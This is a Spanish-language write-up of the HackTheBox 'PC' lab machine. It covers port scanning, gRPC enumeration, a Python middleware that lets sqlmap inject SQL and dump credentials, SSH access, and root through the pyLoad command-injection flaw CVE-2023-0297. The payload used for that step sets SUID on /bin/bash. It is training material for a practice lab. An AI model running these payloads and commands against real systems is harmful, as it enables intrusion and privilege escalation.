---
title: Writeup - Maquina "PC" HackTheBox
author: marcvs
date: 2023-07-10
categories: [Writeup, HackTheBox]
tags: [writeup, hackthebox, grpc, python, linux]
pin: false
img_path: /assets/img/writeups/pc/
image:
    path: pc.png
    alt: HackTheBox PC machine
---

Los **######** significan que la información en esas secciones se omitió por fines prácticos.

## Enumeración remota
### Puertos
Primero debemos ver si el host está encendido haciendo un ping.

```bash
$ ping -c 1 10.10.11.214
PING 10.10.11.214 (10.10.11.214) 56(84) bytes of data.
64 bytes from 10.10.11.214: icmp_seq=1 ttl=63 time=226 ms

--- 10.10.11.214 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 225.810/225.810/225.810/0.000 ms
```

Luego escaneamos los puertos en la maquina, es recomendable colocar el parametro `-Pn` para forzar el escaneo, ya que normalmente hace un descubrimiento de host y al usar una **VPN** posiblemente no detecte el host.

```bash
$ nmap 10.10.11.214 -Pn
Nmap scan report for 10.10.11.214
Host is up (0.16s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 16.40 seconds
```

El escaneo básico no siempre es de mucha ayuda, lo mejor al estar en un CTF es enumerar los **65535** puertos existentes para TCP, pero sería muy lento solo agregando `-p1-65535`, una solución es agregar los **templates** de tiempo y rendimiento con `-T`; al ser un entorno controlado podemos usar la máxima que en este caso es `5`. Agregaremos la opción `-A` para que a medida detecte puertos abiertos trate de detectar el OS, la version del servicio que corre por el puerto, ejecución de algunos scripts básicos para reconocimiento y un traceroute.

```bash
$ nmap -p1-65535 -A -T5 10.10.11.214 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-10 16:41 CST
Nmap scan report for 10.10.11.214
Host is up (0.16s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 91bf44edea1e3224301f532cea71e5ef (RSA)
|   256 8486a6e204abdff71d456ccf395809de (ECDSA)
|_  256 1aa89572515e8e3cf180f542fd0a281c (ED25519)
50051/tcp open  unknown
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service
######
```

Hay un puerto abierto que no reconoce `nmap`, en estos casos lo recomendable es usar `netcat`, ya sea el **Tradicional**, **OpenBSD** o de `nmap` para conectarnos y obtener algo de información.

```bash
$ nc -nv 10.10.11.214 50051
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Connected to 10.10.11.214:50051.
???
```

Al conectarnos se muestran tres interrogantes y pasado un tiempo recibiremos lo siguiente:
* `@Did not receive HTTP/2 settings before handshake timeout`

Al buscar información relacionada con este **"error"**, el primer resultado habla de algo relacionado a **gRPC** y **HTTP/2**.
![http2 error netcat conection](http2-error.png)

### gRPC
En la página web del servicio [grpc.io](https://grpc.io/) podemos ver que efectivamente usa **HTTP/2** en su comunicación, sin embargo, no es posible usar un navegador web o herramientas como `curl` para comunicarnos con él, pero sí su variante llamada [grpcurl](https://github.com/fullstorydev/grpcurl). También podemos usar [Postman](https://www.postman.com/downloads/) o [gRPC UI](https://github.com/fullstorydev/grpcui).

```bash
$ ./grpcurl -v -plaintext 10.10.11.214:50051 list
SimpleApp
grpc.reflection.v1alpha.ServerReflection
```

El servicio tiene un nombre **SimpleApp**, al igual que con Clases en POO tenemos métodos, los cuales podemos enumerar.

```bash
$ ./grpcurl -v -plaintext 10.10.11.214:50051 describe SimpleApp
SimpleApp is a service:
service SimpleApp {
  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
}
```

Existen tres métodos, el más interesante es el `getInfo`. Vamos a enumerar por partes, es decir, ver que contiene su **Request** y que contiene su **Response**.

```bash
$ ./grpcurl -v -plaintext 10.10.11.214:50051 describe .getInfoRequest
getInfoRequest is a message:
message getInfoRequest {
  string id = 1;
}
```

Tratemos de enviar data a ese campo `id` con el método `getInfo`.

```bash
$ ./grpcurl -plaintext -d '{"id":"1"}' 10.10.11.214:50051 SimpleApp/getInfo
{
  "message": "Authorization Error.Missing 'token' header"
}
```

Nos pide un **cabecera de autorización**, ya hemos visto que existe un método **Login** y uno **Register**, por lo que podemos suponer que así obtendremos ese **token**, enumeremos.


```bash
$ ./grpcurl -v -plaintext 10.10.11.214:50051 describe .RegisterUserRequest
RegisterUserRequest is a message:
message RegisterUserRequest {
  string username = 1;
  string password = 2;
}
```

```bash
$ ./grpcurl -v -plaintext 10.10.11.214:50051 describe .LoginUserRequest
LoginUserRequest is a message:
message LoginUserRequest {
  string username = 1;
  string password = 2;
}
```

Tanto para **Login** como **Register** tenemos los campos `username` y `password`. Así que, primero nos registramos y luego nos logueamos.

```bash
$ ./grpcurl -plaintext -d '{"username":"test", "password":"test1234"}' 10.10.11.214:50051 SimpleApp/RegisterUser
{
  "message": "Account created for user test!"
}
```

Una vez creada la cuenta, al loguearnos solo veremos la respuesta que dice `{"message": "Your id is 575."}`, pero necesitamos un **token**. Podemos usar la opción `-v` para activar el **verbose** y ver más información de la respuesta.

```bash
$ ./grpcurl -v -plaintext -d '{"username":"test", "password":"test1234"}' 10.10.11.214:50051 SimpleApp/LoginUser

Resolved method descriptor:
rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );

Request metadata to send:
(empty)

Response headers received:
content-type: application/grpc
grpc-accept-encoding: identity, deflate, gzip

Response contents:
{
  "message": "Your id is 301."
}

Response trailers received:
token: b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDg5NDM3N30.G4s9n9jOqSx91Nu8Kn2My0cC8SphTxefVYG6nazeWiI'
Sent 1 request and received 1 response
```

Ahora sí ya vemos el token. Ahora lo usaremos para ver que hay en `getInfo`. Ese `id` que nos da, podemos usarlo para hacer las pruebas.

```bash
$ ./grpcurl -plaintext -H "token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDg5NDY5MH0.5gYk1d4TAeoDL7TfQFBxMTmJ30-7bffbgoQBqF0-QEM" -d '{"id":"301"}' 10.10.11.214:50051 SimpleApp/getInfo
{
  "message": "Will update soon."
}
```

Vemos que hay un mensaje, hay que tener cuidado, en este caso el usuario se borrará luego de un rato y necesitaremos registrarnos y loguearnos de nuevo.

## Usuario bajos privilegios
### SQLi
Cuando tenemos un **id** es común que exista una base de datos detrás, por lo que podemos probar **inyecciones SQL** para este servicio. En el backend se usa **SQLite**, sin embargo, enumerarlo de esta forma es tedioso, podemos usar `sqlmap` si usamos la herramienta basada en web para enumerar el **gRPC**, pero es mejor siempre practicar las habilidades de programación para resolver estos casos.

### MiddleWare
Programé un script, basado el [middleware](https://marcvspt.github.io/posts/middleware-para-sqli/#script-middleware-1) que desarrollé anteriormente en mí página web. Este permite comunicarme a través de **HTTP** a mi `localhost` y redirigir el tráfico al servicio **gRPC** de la máquina remota. La principal diferencia es la inclusion del **token de autorización**.

```python
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse
from grpc import insecure_channel
import simpleapp_pb2
import simpleapp_pb2_grpc
import sys
import signal
import argparse

def signal_handler(sig, frame):
    print('[!] Exiting\n')
    sys.exit(1)

def send_grpc(payload):
    meta = [('token', f'%s' % args.token)]
    channel = insecure_channel(f'%s:%d' % (args.ip, args.rport))
    stub = simpleapp_pb2_grpc.SimpleAppStub(channel)
    request = simpleapp_pb2.getInfoRequest(id=payload)

    response = stub.getInfo(request,metadata=meta)

    if response:
        return response
    else:
        return ''

def middleware_server(lport,content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=',1)[1]
            except IndexError:
                payload = False

            if payload:
                content = send_grpc(payload)
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.message.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(lport, CustomHandler)
    httpd.serve_forever()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)

    parser = argparse.ArgumentParser(description='Middleware: HTTP to gRPC')
    parser.add_argument('-i', '--ip', dest='ip', type=str, help='gRPC server IP', required=True)
    parser.add_argument('-p', '--port', dest='rport', type=int, help='gRPC server port', required=True, default=50051)
    parser.add_argument('-t', '--token', dest='token', type=str, help='Token for authentication', required=True)
    parser.add_argument('--lport', dest='lport', type=int, help='Local port for HTTP', required=False, default=8181)
    args = parser.parse_args()

    try:
        print("[+] Starting MiddleWare HTTP->gRPC Server")
        print("[+] Send payloads in http://localhost:%s/?id=*" % args.lport)
        middleware_server(('0.0.0.0',args.lport))
    except KeyboardInterrupt:
        pass
```

Este software necesita las dependencias: `pip3 install grpcio grpcio-tools`. La primera para el **middleware** y la segunda para crear los archivos `pb2` y `pb2_grpc` apartir de un archivo `.proto`. Este último archivo, tiene los métodos del servicio, y se crea enumerandolo como hicimos al principio con `grpcurl` u otras herramientas.

Debes llamarlo `simpleapp.proto`.

```proto
syntax = "proto3";

service SimpleApp {
  rpc LoginUser (LoginUserRequest) returns (LoginUserResponse);
  rpc RegisterUser (RegisterUserRequest) returns (RegisterUserResponse);
  rpc getInfo (getInfoRequest) returns (getInfoResponse);
}

message LoginUserRequest {
  string username = 1;
  string password = 2;
}

message LoginUserResponse {
  string message = 1;
}

message RegisterUserRequest {
  string username = 1;
  string password = 2;
}

message RegisterUserResponse {
  string message = 1;
}

message getInfoRequest {
  string id = 1;
}

message getInfoResponse {
  string message = 1;
}
```

Es necesario crear las dependencias; en forma de scripts y clases de **Python**, de donde se extraerán los métodos del servicio **gRPC**. Esto se hace apartir del `simpleapp.proto`.

```bash
$ python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. simpleapp.proto
```

Debemos ejecutar script en la ruta donde se crearon los archivos `.py` anteriores. La herramienta funciona con 3 argumentos obligatorios:
* `-p` o `--port` para el puerto del servicio **gRPC** remoto.
* `-i` o `--ip` para la IP del servidor **gRPC** remoto.
* `-t` o `--token` para configurar el token de autenticación para el metodo `getInfo`.

El servicio **HTTP** local se inicia en el puerto `8181` por defecto, con `--lport` podemos cambiar este puerto.

```bash
$ python3 middleware.py -p 50051 -i 10.10.11.214 -t "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdCIsImV4cCI6MTY4NDg5NDY5MH0.5gYk1d4TAeoDL7TfQFBxMTmJ30-7bffbgoQBqF0-QEM"

[*] Starting server: "http://localhost:8181/?id=%"
######
```

Ahora podemos usar `sqlmap` para automatizar el proceso. En algunos casos vermeos errores en los logs del script, es normal debido a que herramienta está haciendo pruebas antes de comenzar el ataque.

```bash
$ sqlmap -u "http://localhost:8181/?id=1" --batch --dump-all
######
[18:05:24] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[18:05:24] [INFO] sqlmap will dump entries of all tables from all databases now
[18:05:24] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:05:25] [INFO] fetching columns for table 'accounts'
[18:05:26] [INFO] fetching entries for table 'accounts'
Database: <current>
Table: accounts
[2 entries]
+------------------------+----------+
| password               | username |
+------------------------+----------+
| admin                  | admin    |
| HereIsYourPassWord1431 | sau      |
+------------------------+----------+

[18:05:26] [INFO] table 'SQLite_masterdb.accounts' dumped to CSV file '/root/.local/share/sqlmap/output/localhost/dump/SQLite_masterdb/accounts.csv'
[18:05:26] [INFO] fetching columns for table 'messages'
[18:05:27] [INFO] fetching entries for table 'messages'
Database: <current>
Table: messages
[1 entry]
+----+----------------------------------------------+----------+
| id | message                                      | username |
+----+----------------------------------------------+----------+
| 1  | The admin is working hard to fix the issues. | admin    |
+----+----------------------------------------------+----------+
######
```

Trataremos de conectarnos con ese usuario **sau** y esa contraseña por **SSH**.

```bash
$ sshpass -p "HereIsYourPassWord1431" ssh sau@10.10.11.214
#####
sau@pc:~$ ls
user.txt
sau@pc:~$ cat user.txt
a14**************************592
```

## Escalada de privilegios
### Enumeración local
Una buena practica al hacer pentest y tener acceso a la consola del servidor es ver los puertos abiertos solo en la red local, en este caso podemos ver que esta el puerto `8000`.

```bash
sau@pc:~$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN
#####
```

### PyLoad service
Podemos traerlo con **Port Fordwarding** a través del **SSH** a nuestra maquina. Convertiremos ese puerto `8000` en el puerto `80` para verlo de nuestro lado.

```bash
$ sshpass -p "HereIsYourPassWord1431" ssh -L 80:127.0.0.1:8000 sau@10.10.11.214
```

Ahora con nmap podemos hacer un escaneo especifico a este puerto.

```bash
$ nmap -A -p80 localhost
Nmap scan report for localhost (127.0.0.1)
Host is up (0.000039s latency).
Other addresses for localhost (not scanned): ::1

PORT   STATE SERVICE VERSION
80/tcp open  http    CherryPy wsgiserver
|_http-server-header: Cheroot/8.6.0
| http-robots.txt: 1 disallowed entry
|_/
| http-title: Login - pyLoad
|_Requested resource was /login?next=http%3A%2F%2Flocalhost%2F
#####
```

Parece ser un servicio web que tiene un **login**, haciendo pruebas podemos asegururar que este no es vulnerable a ningun tipo de bypassing.

![PyLoad service login](pyload.png)

### RCE
Investigando más acerca de este servicio; especificamente de vulnerabilidades y exploits, encontramos un articulo donde nos explican que hay un [Remote Command Execution](https://huntr.dev/bounties/3fd606f7-83e1-4265-b083-2e1889a05e65/) en una ruta especifica y un [CVE](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0297) asignado. En sí la estructura para la inyección de comandos es `pyimport os;os.system("touch /tmp/pwnd");`, debe estar **URL encoded** para que funcione, podemos usar [CyberChef](https://gchq.github.io/CyberChef/) para ello, lo mejor es ejecutar un `chmod u+s /bin/bash` para evitar problemas en los envíos de shell reversa, este es el comando final hecho con `curl`.

Antes de ejecutarlo, podemos ver que la `bash` no es **SUID**.

![bash no SUID](no-suid.png)

El payload debemos ponerlo en el campo `jk` de la petición.

```bash
sau@pc:~$ curl -i -s -k -X 'POST' -H 'Host: 127.0.0.1:8000' -H $'Content-Type: application/x-www-form-urlencoded' --data-binary 'package=xxx&crypted=AAAA&jk=pyimport%20os%3Bos%2Esystem%28%22chmod%20u%2Bs%20%2Fbin%2Fbash%22%29%3B&passwords=aaaa' 'http://127.0.0.1:8000/flash/addcrypted2'
```

Ya es **SUID** la `bash`. Ahora solo ejecutamos `bash -p` para obtener una consola como el usuario propietario que es **root**.

![bash SUID](suid.png)

```bash
sau@pc:~$ bash -p
bash-5.0# cat /root/root.txt
bda**************************681
```